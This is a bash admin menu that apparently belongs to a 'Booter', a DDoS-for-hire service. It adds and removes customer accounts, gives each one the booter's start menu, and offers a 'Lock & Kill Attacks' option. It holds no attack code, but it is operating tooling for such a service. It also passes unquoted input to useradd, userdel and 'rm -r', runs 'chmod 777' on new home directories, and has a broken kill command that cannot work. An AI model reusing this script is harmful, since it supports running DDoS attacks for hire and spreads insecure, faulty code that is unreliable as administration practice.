#!/bin/bash
BLACK='\e[0;30m'
BLUE='\e[0;34m'
GREEN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
PURPLE='\e[0;35m'
BROWN='\e[0;33m'
LIGHTGRAY='\e[0;37m'
DARKGRAY='\e[1;30m'
LIGHTBLUE='\e[1;34m'
LIGHTGREEN='\e[1;32m'
LIGHTCYAN='\e[1;36m'
LIGHTRED='\e[1;31m'
LIGHTPURPLE='\e[1;35m'
YELLOW='\e[1;33m'
WHITE='\e[1;37m'
NC='\e[0m'              # No Color
# Trap Signal Script
#
#TitaniumScript.bypass//BASH  Bypass.Function $invisible.inv
#
exit_script()
{
  echo "* * *Trap * * *"
  ./admin
}

lockkill()
{
#!/bin/bash
clear
echo "+=================================+"
echo "+---------------------------------+"
echo " +      Lock & Kill Attacks      + "
echo " +                               + "
echo " +-------------------------------+ "
echo "Enter Username: "
read uname
passwd -l $uname
kill -9 ps -u $uname -o "pid="
echo "Press any key when done"
read
}

adduser()
{
#!/bin/bash
clear
echo "+=================================+"
echo "+---------------------------------+"
echo " +           Add New User        + "
echo " +                               + "
echo " +-------------------------------+ "
echo " "
echo "New Username: "
read uname
useradd $uname
mkdir /home/$uname
cp /root/Booter/start /home/$uname/menu
passwd $uname 
cd /home/$uname
chmod 777 *
echo "User Added, Password set"
echo "Press any key when done"
read
}

deluser()
{
#!/bin/bash
clear
echo "+=================================+"
echo "+---------------------------------+"
echo " +           Remove User         + "
echo " +                               + "
echo " +-------------------------------+ "
echo " "
echo "Username: "
read uname
userdel $uname
rm -r /home/$uname
echo "User removed"
echo "Press any key when done"
read
}

lstprocesses()
{
#!/bin/bash
clear
echo "+=================================+"
echo "+---------------------------------+"
echo " +      List User Processes      + "
echo " +                               + "
echo " +-------------------------------+ "
echo "Enter Username: "
read uname
ps aux | grep -i $uname
echo "Press any key when done"
read
}

